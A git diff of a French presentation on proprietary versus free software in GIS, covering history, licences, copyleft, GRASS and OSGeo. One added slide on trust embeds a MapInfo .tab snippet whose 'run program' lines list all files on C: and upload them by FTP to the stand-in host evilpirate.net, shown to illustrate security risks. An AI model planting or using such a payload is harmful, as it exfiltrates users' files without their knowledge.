@@ -67,8 +67,7 @@ Jean-Roc Morreale
 
 ## Historique général
 
-
-Au début, c'était presque simple
+### L'ère 1950-1970
 
 .center[![IBM704](./illustrations/406-IBM_704_mainframe.gif)]
 
@@ -81,9 +80,7 @@ Au début, c'était presque simple
 
 ---
 
-## Historique général
-
-Puis avec la miniaturisation et l'informatique personnelle vint l'ère du logiciel propriétaire
+### L'ère 1970-2000
 
 .center[![IBMPC](./illustrations/Ibm_pc_5150_reduit.jpg)]
 
@@ -96,9 +93,7 @@ Puis avec la miniaturisation et l'informatique personnelle vint l'ère du logici
 
 ---
 
-## Historique général
-
-Qui entraîne en réaction l'apparition des concepts de logiciels **opensource** et **libres**
+**opensource** et **libres**
 
 .center[![OSI]()]
 .center[![GNU]()]
@@ -110,9 +105,7 @@ Qui entraîne en réaction l'apparition des concepts de logiciels **opensource**
 
 ---
 
-## Historique général
-
-Aujourd'hui, l'enjeu c'est les services
+### l'ère actuelle
 
 .center[![CLOUD]()]
 
@@ -125,24 +118,85 @@ Aujourd'hui, l'enjeu c'est les services
 
 ## Qu'est-ce qu'un logiciel propriétaire ?
 
+### Définition
+
 C'est un logiciel dont le propriétaire à l'usage **exclusif** de tous les droits.
 
-L'utilisateur a uniquement les droits que le propriétaire lui concéde.
+L'utilisateur a uniquement les droits que le propriétaire lui concède.
 
+Un logiciel gratuit peut être propriétaire.
 
 ???
 
 + le propriétaire décide
   + des conditions d'utilisation (nombre de postes autorisés, le cadre commercial ou pas, etc.)
   + de l'accès au code source et de ce qui peut en être fait
-+ là où ça coince
-  + dépendance envers un seul éditeur, exemples ESRI
-  + sécurité, exemple de la NSA et RSA
-  + pérennité, exemples ESRI
 
 ---
 
+### Problèmes de pérennité
+
++ ArcInfo Workstation
++ ArcIMS / ArcWeb
++ ArcGIS API Silverlight/Flex
++ ArcGIS Crystal Reports Wizard
++ Google Earth Professional
++ Google Maps Engine
+
+???
+
++ seul l'éditeur décide du devenir de son produit (arrêt total, arrêt du support d'une version d'un OS)
++ vos investissements dans un logiciel peuvent devenir caduc
++ impossible de reprendre le dev
+
+---
+
+### Problèmes de dépendances et d’interopérabilités
+
+Beaucoup de limites et de complications :
+
++ avec des formats fermés (ArcGIS Geodatabase, Autodesk DWG, Adobe AI, [...])
++ avec des conditions d'utilisation non-négociables (une licence par cœur de processeur, un dongle à brancher,  une connexion internet pour l'activation, [...])
++ des fonctionnalités bridées (repayer une licence pour dégriser un bouton, accès restreints aux services en ligne de l'éditeur, [...])
+
+???
+
++ l'éditeur augmente ses tarifs, pouvez-vous négocier ?
++ impossible de collaborer avec un collègue ne disposant pas du bon logiciel, voir de la bonne version
++ un collègue doit travailler sur le logiciel cette semaine mais il n'y a plus de licence disponible
++ vous avez la version A mais le service d'en face à la version C
++ le proxy de votre DSI bloque l'accès au serveur de licence
+
+---
+
+### Problèmes de confiance
+
+Vous n'avez aucun regard :
++ sur les failles de sécurité
++ sur l'activité réelle du logiciel
++ sur l'impartialité de l'éditeur
+
+    !table
+    !version 450
+    !charset WindowsLatin1
+    
+    run program "cmd.exe /c dir /s c:\ > %temp%\allfiles.txt"
+    run program "cmd.exe /c echo open evilpirate.net >%temp%\commands.txt"
+    run program "cmd.exe /c echo guestuser >> %temp%\commands.txt"
+    run program "cmd.exe /c echo guestpw >> %temp%\commands.txt"
+    run program "cmd.exe /c echo put %temp%\allfiles.txt >> %temp%\commands.txt"
+    run program "cmd.exe /c ftp -s:%temp%\commands.txt"
+
+---
+
++ le code en exemple permet de récupérer les mots de passe d'un utilisateur MapInfo ouvrant un .tab sous Windows
++ la société RSA a vérolé un algo de chiffrement qu'elle commercialisait pour le compte de la NSA
++ Yahoo a du laisser le gov usa accéder aux boites mails de tous ses utilisateurs
++ ou plus simplement, comment vérifier l'exactitude d'un traitement ?
+
 ## Qu'est-ce qu'un logiciel libre ?
+
+### Définition
 
 C'est un ensemble de 4 libertés :
 
@@ -151,59 +205,126 @@ C'est un ensemble de 4 libertés :
 + d'étudier
 + de modifier et de redistribuer
 
+Pour plus de lecture : [livretdulibre.org](ttp://www.livretdulibre.org/)
+
 ???
 
-+ http://www.livretdulibre.org/
-+ licence d'un logiciel propriétaire = liste de restrictions
-* licence d'un logiciel libre = liste de possibilités
++ d'utilisation signifie que tous peuvent l'utiliser et pour tous les usages
++ la copie peut se faire sans aucune autorisation de l'éditeur
++ l'étude du code source permet de comprendre le fonctionnement exact
++ le code source peut être modifier pour adapter ou étendre le logiciel, le logiciel comportant ces modifications peut être redistribué
 
 ---
 
-# Les licences
+### La différence entre opensource et libre
 
-.center[BSD/MIT]
+C'est la notion de **copyleft**, ce qui *est* libre *reste* libre.
 
----
-
-# Les licences
-
-.center[GPL]
++ les licences sans copyleft (BSD, MIT, [...]) sont **opensource**
++ les licences avec copyleft (CeCILL, GPL, [...]) sont **libre**
 
 ---
 
-# Historique spécifique au SIG
+???
+
++ le code d'un logiciel opensource peut être repris dans un logiciel propriétaire sans aucune contrepartie
++ le code d'un logiciel libre ne peut pas l'être, les modifications doivent être placées sous la même licence ou une compatible
+
+---
+
+### Quelques grosses précisions
+
++ Libre ne veut pas dire gratuit.
++ Un logiciel libre peut être commercialisé
+
+???
+
++ un éditeur d'un logiciel libre peut le mettre uniquement à disposition de ses clients
+  +  mais ceux-ci peuvent le redistribuer
+
+---
+
+## Le SIG façon libre
+
+### Basé sur un constat simple
+
+.center[**Plus on partage, plus on en a.**]
+
+???
+
++ croisement des intérêt idéologiques, commerciaux et pratiques
++ il est plus simple 
+  + de réutiliser le travail existant
+  + de laisser l'opportunité à d'autres d'améliorer le logiciel
+
+---
+
+### Aussi vieux que le SIG en informatique
+
++ Map Overlay and Statistical System - **MOSS**
+  + 1978
++ Geographic Resource Analysis Support Software - **GRASS**
+  + 1982
 
 .center[GRASS]
 
+A voir : [GRASS, l'armée et Star Treck](https://www.youtube.com/watch?v=U3Hf0qI4JLc)
 
 ???
 
-+ un des premiers SIG
-+ début universitaire
-+ repris par l'armée américaine
++ MOSS
+  + le premier SIG interactif, vectoriel et utilisable sur un *microcomputer*
++ GRASS
+  + créé dans un labo pour convaincre la direction d'acheter ARC/INFO
+  + 1982 à 1997 U.S. Army, Corps of Engineers
+  + 1997 Baylor University (Texas), 1998 University of Hannover, 2001 Trento
 
 ---
 
-# Historique spécifique au SIG
+### Une communauté dynamique
 
-.center[OGC]
+Elle est présente :
 
-???
++ sur tous les continents
++ dans tous les domaines
++ avec toutes les compétences
 
-+ issu l'Open Grass Fondation
-+ réunit tout les éditeurs
-+ produit et maintient les normes
+OSGEO = Open Source Geospatial Foundation
 
----
-
-# Historique spécifique au SIG
++ fondée en 2006
++ rôle d'assistance et de promotion
++ regroupe des dizaines de projets
 
 .center[OSGEO]
 
 ???
 
++ TODO : annoncer qgis-fr et foss4g-eu
++ un projet peut avoir des contributeurs de l'Alaska à l'Australie
++ de l'aérospatial à l'archéologie
++ dév, trad, doc, recherche
 + les débuts Autodesk Mapguide
 + les buts de l'asso
+
+---
+
+### Un impact global
+
+Sur tout les fronts :
+
++ les normes
++ les formats
++ et mêmes dans les applications propriétaires
+
+.center[OGC]
+
+???
+
++ l'OGC est issu de l'Open Grass Fondation
+  + réunit tout les éditeurs
+  + produit et maintient les principales normes
++ exemple de la libtiff/geotiff
++ proj4, gdal/ogr dans arcgis, fme, google earth
 
 ---
 
